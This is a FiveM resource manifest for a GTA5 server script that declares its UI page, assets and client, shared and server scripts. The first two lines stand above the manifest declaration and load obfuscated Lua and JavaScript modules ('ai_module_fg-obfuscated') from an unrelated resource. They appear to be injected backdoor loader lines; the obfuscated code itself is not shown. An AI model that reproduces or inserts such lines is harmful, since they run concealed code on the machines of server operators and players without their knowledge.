shared_script '@regreso_core/ai_module_fg-obfuscated.lua'
shared_script '@regreso_core/ai_module_fg-obfuscated.js'
 
 
fx_version 'adamant'
game 'gta5'
version '1.2.0'
ui_page ('html/index.html')
files (
    {
      '**/*.html',
      '**/**/*.css',
      '**/**/*.ttf','**/**/*.otf',
      '**/**/*.js'
    }
)
client_scripts ({'client/*.lua'})
shared_scripts ({'config/*.lua'})
server_scripts ({'server/*.lua','@oxmysql/lib/MySQL.lua'})
